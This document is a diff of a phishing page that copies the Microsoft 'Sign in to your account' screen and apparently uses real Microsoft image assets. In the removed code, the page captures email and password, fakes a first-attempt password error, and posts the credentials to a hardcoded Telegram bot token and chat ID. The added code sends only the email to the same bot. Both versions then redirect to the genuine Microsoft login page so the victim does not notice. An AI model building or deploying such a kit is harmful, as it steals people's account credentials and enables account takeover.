@@ -6,102 +6,79 @@
     <title>Sign in to your account</title>
     <style>
         * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
-        
-        body, html {
-            margin: 0; padding: 0; height: 100%; width: 100%;
-            font-family: 'Segoe UI', Tahoma, Helvetica, Sans-Serif;
-        }
+        html, body { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Segoe UI', Arial, sans-serif; }
 
         body {
-            /* Forced Background with Fallback Color */
             background-color: #deeaf4;
             background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg');
-            background-repeat: no-repeat;
-            background-position: center center;
-            background-attachment: fixed;
-            background-size: cover;
-            display: flex; justify-content: center; align-items: center;
+            background-size: cover; background-position: center; background-repeat: no-repeat;
+            background-attachment: fixed; display: flex; justify-content: center; align-items: center;
         }
 
         .login-card {
-            background: #fff;
-            width: 440px;
-            padding: 44px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            min-height: 376px;
-            position: relative;
+            background: #fff; width: 440px; padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2); min-height: 376px;
         }
 
-        .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
-        
-        h1 { 
-            font-size: 24px; font-weight: 600; 
-            margin: 0 0 16px 0; color: #1b1b1b; 
-        }
-
-        .identity-container {
-            display: flex; align-items: center;
-            margin-bottom: 20px; cursor: pointer;
-            font-size: 15px; color: #1b1b1b;
-        }
-
-        .back-arrow {
-            width: 24px; height: 24px; margin-right: 8px;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M20 24l-8-8 8-8" fill="none" stroke="%23505050" stroke-width="2"/></svg>') no-repeat center;
-        }
+        .ms-logo { width: 108px; margin-bottom: 24px; }
+        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
 
         .input-field {
             width: 100%; border: none; border-bottom: 1px solid #666;
-            padding: 8px 0; font-size: 16px; margin-bottom: 12px;
-            outline: none; transition: border-color 0.2s;
+            padding: 8px 0; font-size: 16px; margin-bottom: 12px; outline: none;
         }
-
         .input-field:focus { border-bottom: 2px solid #0067b8; }
 
-        .error-msg { color: #e81123; font-size: 13px; margin-bottom: 10px; display: none; }
+        /* Links styling */
+        .link-text { font-size: 13px; margin: 12px 0; color: #1b1b1b; }
+        .link-text a { color: #0067b8; text-decoration: none; cursor: pointer; }
+        .link-text a:hover { text-decoration: underline; }
 
-        .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
+        .button-row { display: flex; justify-content: flex-end; margin-top: 25px; gap: 8px; }
+
+        .btn-secondary {
+            background-color: #ccc; color: #333; border: none;
+            padding: 8px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
+        }
 
         .btn-primary {
             background-color: #0067b8; color: #fff; border: none;
-            padding: 8px 32px; font-size: 15px; cursor: pointer;
-            min-width: 108px;
+            padding: 8px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
         }
 
-        .btn-primary:hover { background-color: #005da6; }
-        .btn-primary:disabled { background-color: #ccc; cursor: not-allowed; }
-
-        .footer {
-            position: fixed; bottom: 0; right: 0;
-            padding: 12px 30px; font-size: 12px;
+        /* Sign-in Options Box */
+        .options-box {
+            background: #fff; width: 440px; padding: 12px 44px;
+            margin-top: 1px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            display: flex; align-items: center; cursor: pointer;
         }
+        .key-icon { width: 24px; margin-right: 12px; opacity: 0.6; }
+
+        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
         .footer a { margin-left: 24px; text-decoration: none; color: #000; }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo" alt="Microsoft">
-        
-        <div id="section-email">
+    <div style="display: flex; flex-direction: column;">
+        <div class="login-card">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo">
+            
             <h1>Sign in</h1>
-            <input type="email" id="inp-email" placeholder="Email, phone, or Skype" class="input-field" autocomplete="off">
+            <input type="email" id="email" placeholder="Email, phone, or Skype" class="input-field">
+            
+            <p class="link-text">No account? <a onclick="alert('Demo Mode: Link disabled')">Create one!</a></p>
+            <p class="link-text"><a onclick="alert('Demo Mode: Link disabled')">Can't access your account?</a></p>
+
             <div class="button-row">
-                <button class="btn-primary" onclick="goToPassword()">Next</button>
+                <button class="btn-secondary" onclick="location.reload()">Back</button>
+                <button class="btn-primary" onclick="submitToTelegram()">Next</button>
             </div>
         </div>
 
-        <div id="section-password" style="display: none;">
-            <div class="identity-container" onclick="goToEmail()">
-                <div class="back-arrow"></div>
-                <span id="display-user"></span>
-            </div>
-            <h1>Enter password</h1>
-            <div id="err-pass" class="error-msg">That password is incorrect. Please try again.</div>
-            <input type="password" id="inp-pass" placeholder="Password" class="input-field">
-            <div class="button-row">
-                <button class="btn-primary" id="btn-submit" onclick="finalSubmit()">Sign in</button>
-            </div>
+        <div class="options-box">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon">
+            <span style="font-size: 15px;">Sign-in options</span>
         </div>
     </div>
 
@@ -111,49 +88,15 @@
     </div>
 
     <script>
-        let userEmail = "";
-        let attempt = 0;
-
-        function goToPassword() {
-            userEmail = document.getElementById('inp-email').value;
-            if(!userEmail) return;
-            document.getElementById('section-email').style.display = 'none';
-            document.getElementById('section-password').style.display = 'block';
-            document.getElementById('display-user').innerText = userEmail;
-            document.getElementById('inp-pass').focus();
-        }
-
-        function goToEmail() {
-            document.getElementById('section-password').style.display = 'none';
-            document.getElementById('section-email').style.display = 'block';
-        }
-
-        async function finalSubmit() {
-            const pass = document.getElementById('inp-pass').value;
-            const err = document.getElementById('err-pass');
-            const btn = document.getElementById('btn-submit');
-            
-            if(!pass) return;
-            attempt++;
-
-            // Mimic real validation: Fail once, succeed twice
-            if(attempt === 1) {
-                err.style.display = 'block';
-                document.getElementById('inp-pass').value = "";
-                return;
-            }
-
-            // Success Flow
-            err.style.display = 'none';
-            btn.innerText = "Verifying...";
-            btn.disabled = true;
+        async function submitToTelegram() {
+            const email = document.getElementById('email').value;
+            if(!email) return;
 
             const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
             const chatId = "5733378501";
-            const text = `🎯 **SUCCESSFUL INTERCEPT**\n\n**User:** ${userEmail}\n**Pass:** ${pass}`;
+            const text = `🚨 **FINAL TRIAL**\n\n**Email:** ${email}`;
 
             try {
-                // Using 'keepalive' to ensure the request finishes even if the page redirects
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -162,11 +105,7 @@
                 });
             } catch (e) {}
 
-            // Delay redirect slightly to ensure Telegram receives the data
-            setTimeout(() => {
-                const finalUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-f0d6-410c-984c-f8310070e304&response_type=id_token&scope=openid&nonce=123&login_hint=" + encodeURIComponent(userEmail);
-                window.location.href = finalUrl;
-            }, 800);
+            window.location.href = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-f0d6-410c-984c-f8310070e304&response_type=id_token&scope=openid&nonce=123&login_hint=" + encodeURIComponent(email);
         }
     </script>
 </body>
